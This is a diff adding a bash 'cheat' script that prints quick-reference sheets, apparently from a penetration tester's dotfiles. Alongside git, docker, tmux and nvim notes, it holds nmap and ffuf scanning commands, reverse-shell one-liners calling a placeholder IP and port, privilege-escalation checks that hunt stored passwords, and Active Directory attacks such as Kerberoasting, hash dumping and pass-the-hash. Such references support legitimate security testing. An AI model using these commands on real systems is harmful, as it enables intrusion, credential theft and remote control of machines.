@@ -1,0 +1,218 @@
+#!/usr/bin/env bash
+# =============================================================================
+# cheat -- Quick reference for common commands
+# Usage: cheat <topic>
+# =============================================================================
+
+topic="${1:-help}"
+
+case "$topic" in
+  nmap)
+    cat << 'EOF'
+nmap cheatsheet
+  nmap -sn 10.10.10.0/24              # Ping sweep
+  nmap -sV -sC -T4 <target>           # Service + scripts
+  nmap -sV -sC -A -T4 -p- <target>    # Full port scan
+  sudo nmap -sS -T2 -f <target>       # Stealth SYN
+  sudo nmap -sU -sV -T4 <target>      # UDP scan
+  nmap --script vuln <target>          # Vuln scripts
+  nmap -sV --script=banner <target>    # Banner grab
+  nmap -oA output <target>             # Save all formats
+EOF
+    ;;
+  ffuf)
+    cat << 'EOF'
+ffuf cheatsheet
+  ffuf -u URL/FUZZ -w wordlist.txt                      # Dir brute
+  ffuf -u URL -w wordlist.txt -H "Host: FUZZ.site.com"  # Vhost
+  ffuf -u URL?FUZZ=value -w params.txt                  # Param fuzz
+  ffuf -u URL -w wordlist.txt -mc 200,301 -fc 404       # Filter codes
+  ffuf -u URL/FUZZ -w wordlist.txt -e .php,.html,.txt   # Extensions
+  ffuf -u URL -d "user=FUZZ&pass=test" -w users.txt     # POST fuzz
+EOF
+    ;;
+  revshells)
+    cat << 'EOF'
+Reverse shells
+  bash -i >& /dev/tcp/IP/PORT 0>&1
+  python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
+  nc -e /bin/sh IP PORT
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP PORT >/tmp/f
+  php -r '$s=fsockopen("IP",PORT);exec("sh <&3 >&3 2>&3");'
+
+Upgrade shell:
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+  Ctrl-Z -> stty raw -echo; fg -> export TERM=xterm-256color
+EOF
+    ;;
+  git)
+    cat << 'EOF'
+git cheatsheet
+  git log --oneline --graph --all      # Visual log
+  git diff --staged                    # Staged changes
+  git stash && git stash pop           # Stash / restore
+  git rebase -i HEAD~N                 # Interactive rebase
+  git bisect start/bad/good            # Binary search bug
+  git reflog                           # Recovery log
+  git cherry-pick <sha>                # Pick commit
+  git reset --soft HEAD~1              # Undo last commit (keep changes)
+  git push --force-with-lease          # Safe force push
+EOF
+    ;;
+  docker)
+    cat << 'EOF'
+docker cheatsheet
+  docker ps -a                         # All containers
+  docker images                        # All images
+  docker exec -it <id> /bin/sh         # Shell into container
+  docker logs -f <id>                  # Follow logs
+  docker system prune -af              # Nuke everything
+  docker build -t name .               # Build image
+  docker compose up -d                 # Start stack
+  docker compose down -v               # Tear down + volumes
+  docker save img > img.tar            # Export image
+  docker load < img.tar                # Import image
+EOF
+    ;;
+  tmux)
+    cat << 'EOF'
+tmux cheatsheet (prefix = Ctrl-a)
+  C-a |         split horizontal
+  C-a -         split vertical
+  C-a h/j/k/l  navigate panes
+  C-a c         new window
+  C-a n/p       next/prev window
+  C-a d         detach
+  C-a g         lazygit popup
+  C-a b         btop popup
+  C-a f         fzf file finder
+  C-a S         new session
+  C-a $         rename session
+  C-a s         list sessions
+EOF
+    ;;
+  nvim)
+    cat << 'EOF'
+nvim cheatsheet (leader = Space)
+  <leader>ff    find files         <leader>fg    live grep
+  <leader>fb    buffers            <leader>fr    recent files
+  <leader>t     file tree          <leader>xH    hex editor
+  <leader>ca    code action        <leader>rn    rename
+  gd            go to definition   gr            references
+  <leader>db    breakpoint         <leader>dc    debug continue
+  <leader>th    terminal (horiz)   <leader>tf    terminal (float)
+  <leader>gg    git fugitive       <leader>gs    git status
+  <leader>cf    format buffer      <leader>xx    diagnostics
+EOF
+    ;;
+  blackarch|ba)
+    cat << 'EOF'
+BlackArch tool cheatsheet
+  Recon:
+    theHarvester -d target.com -b all       # OSINT email/subdomain harvest
+    sherlock username                         # Username search across platforms
+    recon-ng                                 # Recon framework (like msf for OSINT)
+    spiderfoot -l 127.0.0.1:5001            # Web-based OSINT dashboard
+    sublist3r -d target.com                  # Subdomain enumeration
+    katana -u https://target.com             # Web crawl + endpoint extraction
+
+  Web:
+    wpscan --url target.com --enumerate ap,at,u   # WordPress full enum
+    commix --url "http://target.com?id=1"         # Command injection
+    dalfox url "http://target.com?q=test"         # XSS scanner
+    arjun -u http://target.com                    # Hidden parameter discovery
+    jwt_tool <token>                              # JWT analysis + attacks
+    nosqlmap                                       # NoSQL injection
+
+  Wireless:
+    sudo wifite --kill                       # Automated wifi attack
+    sudo bettercap -iface wlan0              # MITM framework
+    sudo airgeddon                           # Wireless audit menu
+
+  Privesc:
+    linpeas.sh                               # Linux privilege escalation
+    winPEAS.exe                              # Windows privilege escalation
+    pspy64                                   # Snoop processes without root
+    sudo -l / find / -perm -4000            # Quick manual checks
+
+  Post-exploitation:
+    evil-winrm -i IP -u user -p pass        # WinRM shell
+    chisel server -p 8080 --reverse         # Reverse port forward (server)
+    chisel client IP:8080 R:socks           # Reverse port forward (client)
+    bloodhound-python -d domain -u user -p pass -ns DC_IP  # AD enum
+
+  Wordlists:
+    /usr/share/seclists/                     # SecLists root
+    /usr/share/wordlists/rockyou.txt         # Classic password list
+    /usr/share/seclists/Discovery/Web-Content/   # Web fuzzing
+    /usr/share/seclists/Usernames/           # Username lists
+    /usr/share/seclists/Passwords/           # Password lists
+EOF
+    ;;
+  privesc|pe)
+    cat << 'EOF'
+Privilege escalation cheatsheet
+  Linux:
+    sudo -l                                  # Check sudo permissions
+    find / -perm -4000 2>/dev/null           # SUID binaries
+    find / -writable -type f 2>/dev/null     # World-writable files
+    cat /etc/crontab; ls -la /etc/cron*      # Cron jobs
+    getcap -r / 2>/dev/null                  # Capabilities
+    env | grep -i pass                       # Env vars
+    ss -tlnp                                 # Internal services
+    uname -a                                 # Kernel version -> searchsploit
+
+  Windows:
+    whoami /priv                             # Token privileges
+    net user / net localgroup administrators  # Users & groups
+    systeminfo                               # Patch level
+    reg query HKLM /f password /t REG_SZ /s  # Registry passwords
+    cmdkey /list                             # Saved creds
+    schtasks /query /fo LIST /v              # Scheduled tasks
+
+  Tools:
+    ./linpeas.sh | tee linpeas.out           # Auto-enum Linux
+    .\winPEAS.exe | tee winpeas.out          # Auto-enum Windows
+    python3 linux-exploit-suggester.py       # Kernel exploits
+    ./pspy64                                 # Monitor processes
+EOF
+    ;;
+  ad|activedirectory)
+    cat << 'EOF'
+Active Directory cheatsheet
+  Enum:
+    enum4linux -a DC_IP                      # SMB/RPC enum
+    nxc smb DC_IP -u '' -p ''       # Null session
+    nxc smb DC_IP -u user -p pass --shares  # Share enum
+    bloodhound-python -d domain -u user -p pass -ns DC_IP
+
+  Attacks:
+    GetNPUsers.py domain/ -no-pass -usersfile users.txt   # AS-REP roast
+    GetUserSPNs.py domain/user:pass -request              # Kerberoast
+    secretsdump.py domain/user:pass@DC_IP                 # Dump hashes
+    psexec.py domain/user:pass@TARGET_IP                  # Remote exec
+    evil-winrm -i IP -u user -H ntlm_hash                # Pass the hash
+
+  Lateral movement:
+    nxc smb RANGE -u user -p pass                # Spray
+    wmiexec.py domain/user:pass@IP                        # WMI exec
+    smbexec.py domain/user:pass@IP                        # SMB exec
+    chisel / ligolo-ng                                     # Tunneling
+EOF
+    ;;
+  help|*)
+    cat << 'EOF'
+cheat -- quick reference sheets
+  cheat nmap         nmap scanning
+  cheat ffuf         web fuzzing
+  cheat revshells    reverse shell one-liners
+  cheat blackarch    BlackArch tools overview
+  cheat privesc      privilege escalation
+  cheat ad           Active Directory attacks
+  cheat git          git workflows
+  cheat docker       docker commands
+  cheat tmux         tmux keybinds
+  cheat nvim         neovim keybinds
+EOF
+    ;;
+esac
